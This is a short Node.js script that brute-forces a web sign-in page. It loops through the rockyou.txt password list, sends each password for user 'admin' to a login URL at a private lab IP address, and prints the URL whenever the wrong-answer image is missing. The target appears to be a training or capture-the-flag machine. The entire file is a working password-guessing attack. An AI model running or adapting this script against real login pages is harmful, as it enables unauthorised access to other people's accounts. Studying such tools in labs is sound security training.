import fetch from 'node-fetch';
import fs from "fs"


let username = 'admin';
function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}

const content = fs.readFileSync("rockyou.txt").toString();
const pswArray = content.split('\n')
// console.log(pswArray)
let i = 0;

while (i < pswArray.length) {
    fetch('http://192.168.56.101/?page=signin&username=' + username + '&password=' + pswArray[i] + '&Login=Login')
        .then(response => {
            console.log(i)
            console.log(response.status)
            response.text()
                .then((data) => {
                    if (data.search('images/WrongAnswer.gif') == -1) {
                        console.log('FINDEDDD :: ---------------------')
                        console.log(response.url)
                    }
                })
        })
        await delay(500);
    i++;
}
